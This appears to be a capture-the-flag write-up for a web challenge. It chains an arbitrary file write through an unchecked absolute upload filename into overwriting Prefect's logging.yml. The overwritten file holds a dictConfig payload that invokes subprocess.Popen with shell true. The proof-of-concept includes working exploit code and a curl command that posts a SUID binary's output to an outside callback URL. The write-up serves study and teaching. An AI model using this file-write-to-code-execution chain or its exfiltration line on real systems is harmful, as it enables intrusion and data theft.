# yaml-practice

**Category:** Web

## Description
> Paste YAML, send it through your existing upload and validate endpoints, and get a clean result panel back without exposing template injection risks.

## Overview
This challenge is not about breaking `yaml.safe_load()` on the submitted document. The real bug is an arbitrary file write in `/upload`: the app trusts the multipart filename as long as it ends in `.yml`, so an absolute path overwrites files outside `uploads/`. The solve uses that primitive to replace Prefect's packaged `prefect/logging/logging.yml` with a malicious `dictConfig` payload, then triggers `/validate` so Prefect instantiates `subprocess.Popen` and exfiltrates `/readflag` output.

## Technical details
The root cause is the filename handling in `upload_yaml()`:

```python
def check_filename(filename: str) -> str:
    if Path(filename).suffix.lower() != ALLOWED_EXTENSION:
        raise ValueError("Only .yml files are allowed.")
    return filename
...
filename = uploaded_file.filename
...
safe_name = check_filename(filename)
...
file_path = UPLOAD_DIR / safe_name
file_path.write_text(decoded_contents)
```

`check_filename()` only enforces the `.yml` suffix. It does not reject absolute paths or normalize the filename back into `UPLOAD_DIR`. In `pathlib`, `UPLOAD_DIR / "/app/.venv/.../logging.yml"` evaluates to the absolute path, so attacker-controlled multipart metadata becomes an arbitrary file write primitive, constrained only by UTF-8 and the 200-byte body limit:

```python
if len(contents) > 200:
    return JSONResponse(
        {"success": False, "error": "File too large."}, status_code=400
    )
```

The write primitive is strong enough because the container deliberately gives the unprivileged app user write access to the virtualenv that holds third-party packages:

```dockerfile
RUN mkdir -p /app/uploads \
    && mkdir -p /app/.venv \
    ...
    && useradd -M -s /usr/sbin/nologin ctf \
    && chown ctf /app/uploads \
    && chown ctf /app/.venv

USER ctf

RUN python3 -m venv --system-site-packages /app/.venv \
    && /app/.venv/bin/pip install --no-cache-dir ... prefect
```

`solve.py` targets exactly that writable package tree:

```python
parser.add_argument(
    "--logging-path",
    default="/app/.venv/lib/python3.14/site-packages/prefect/logging/logging.yml",
)
```

The `/validate` endpoint is only a trigger. It does sanitize the requested filename with `Path(filename).name`, so it cannot be used to read arbitrary paths directly:

```python
safe_name = check_filename(Path(filename).name)
file_path = UPLOAD_DIR / safe_name
...
result = validate_yaml_flow(file_path)
```

That is why the exploit first uploads a benign YAML into `uploads/`, then separately overwrites Prefect's packaged logging config. When `validate_yaml_flow()` runs, Prefect starts its runtime. In Prefect's own source, the packaged config path is `prefect/logging/logging.yml`, and `setup_logging()` feeds it directly into `logging.config.dictConfig()`:

```python
DEFAULT_LOGGING_SETTINGS_PATH = Path(__file__).parent / "logging.yml"
...
config = load_logging_config(... if ... else DEFAULT_LOGGING_SETTINGS_PATH)
...
logging.config.dictConfig(config)
```

Calling a flow also spins up Prefect's temporary server when needed; that server path calls `setup_logging()` again in a fresh Prefect process:

```python
def create_app(...):
    ...
    from prefect.logging.configuration import setup_logging
    setup_logging()
```

The sink is Python's `logging.config.DictConfigurator.configure_handler()`. If a handler mapping contains the special `()` key, the value is resolved as a callable and invoked with the remaining keys as keyword arguments:

```python
if '()' in config:
    c = config.pop('()')
    if not callable(c):
        c = self.resolve(c)
    factory = c
...
kwargs = {k: config[k] for k in config if (k != '.' and valid_ident(k))}
result = factory(**kwargs)
```

This means a malicious logging config can turn handler construction into code execution. The payload generated by `solve.py` is:

```python
payload = (
    "version: 1\n"
    f"handlers: {{h: {{(): subprocess.Popen, args: /readflag give me the flag|curl -d @- {callback_url}, shell: true}}}}\n"
    "root: {level: INFO, handlers: [h]}"
)
```

`solve.py` also enforces the size requirement and reports that the final payload is only 199 bytes, so it fits under the upload limit. Once `dictConfig()` instantiates handler `h`, `subprocess.Popen(args="...", shell=True)` runs immediately. The object returned by `Popen` is not a real logging handler, but that does not matter: the side effect already happened, which is why `/validate` can time out and the exploit still succeeds.

The final step is privileged flag access. The helper binary is SUID-root and only prints `/flag` when called with the exact four arguments `give me the flag`:

```c
if (argc != 5) {
    return 1;
}

if (strcmp(argv[1], "give") != 0 || strcmp(argv[2], "me") != 0 ||
    strcmp(argv[3], "the") != 0 || strcmp(argv[4], "flag") != 0) {
    return 1;
}
...
int fd = open("/flag", O_RDONLY);
...
puts(buf);
```

```dockerfile
&& gcc /tmp/readflag.c -O2 -o /readflag \
&& chown root:root /readflag \
&& chmod 4755 /readflag
```

So the full exploit chain is:
attacker-controlled multipart filename -> arbitrary write to Prefect package files -> malicious `dictConfig` handler factory -> `subprocess.Popen(..., shell=True)` -> SUID `/readflag` -> HTTP exfiltration of the flag.

## Proof-of-Concept
- Step 1: Upload a benign YAML file into `uploads/` so `/validate` has a legitimate filename to process.

```python
benign_name = f"{secrets.token_hex(4)}.yml"
response = upload_yaml(session, base_url, benign_name, "a: 1\n", timeout)
```

Artifact: a normal file such as `ebc70107.yml` exists under `uploads/`. This does not exploit anything yet; it only provides the filename that passes `/validate`'s `Path(filename).name` restriction.

- Step 2: Overwrite Prefect's packaged logging config with a handler factory that executes `/readflag` and posts stdout to a callback URL.

```python
payload = (
    "version: 1\n"
    f"handlers: {{h: {{(): subprocess.Popen, args: /readflag give me the flag|curl -d @- {callback_url}, shell: true}}}}\n"
    "root: {level: INFO, handlers: [h]}"
)
response = upload_yaml(
    session,
    base_url,
    "/app/.venv/lib/python3.14/site-packages/prefect/logging/logging.yml",
    payload,
    timeout,
)
```

Artifact: the file `prefect/logging/logging.yml` inside the writable virtualenv is replaced with attacker-controlled YAML. `solve.py` measures this payload at 199 bytes, so it survives the 200-byte upload limit.

- Step 3: Trigger the flow so Prefect reloads its logging configuration and `dictConfig()` instantiates the malicious handler.

```python
session.post(
    f"{base_url}/validate",
    json={"filename": benign_name},
    timeout=timeout,
)
```

Artifact: the request may return late or time out, but that is expected. The important side effect is that the target process performs an outbound callback because `subprocess.Popen(...)` already executed during handler construction.

- Step 4: Poll the callback service and extract the flag from the request body.

```python
response = session.get(
    f"{webhook_base}/token/{token}/requests",
    headers={"Accept": "application/json"},
    timeout=timeout,
)
match = FLAG_RE.search(content)
```

Artifact: the callback body contains the output of `/readflag`, e.g. `bctf{why_does_prefect_have_packaged_yaml}`. That body is the proof that the arbitrary write reached a trusted YAML config sink and escalated into privileged flag disclosure.

## P/S
The earlier idea in `vd.py` redirects `/readflag` output into `/app/templates/index.html`, but that path is not owned by `ctf` in the Dockerfile, so it is less reliable than out-of-band exfiltration. The webhook-based chain in `solve.py` is the robust solution because it only depends on two guarantees the challenge explicitly gives: writable `/app/.venv` and outbound `curl`.
